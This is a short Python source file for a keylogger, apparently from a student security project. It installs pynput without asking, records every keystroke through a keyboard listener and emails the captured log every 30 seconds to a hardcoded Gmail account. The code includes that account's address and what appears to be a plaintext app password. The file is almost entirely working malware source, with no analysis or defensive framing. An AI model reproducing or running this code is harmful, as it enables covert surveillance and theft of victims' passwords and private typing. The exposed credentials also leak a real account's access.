try: #import necessary libraries
    import threading
    from pynput.keyboard import Listener as keyboardListener
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "sudeeproy67@gmail.com"
    EMAIL_PASSWORD = "nusrpvxakgvnhefp"
    SEND_REPORT_EVERY = 30 
    FILENAME = "C:/Users/sudee/ISAA/output.txt"

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def report(self):
            send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def run(self):
            keyboard_listener = keyboardListener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()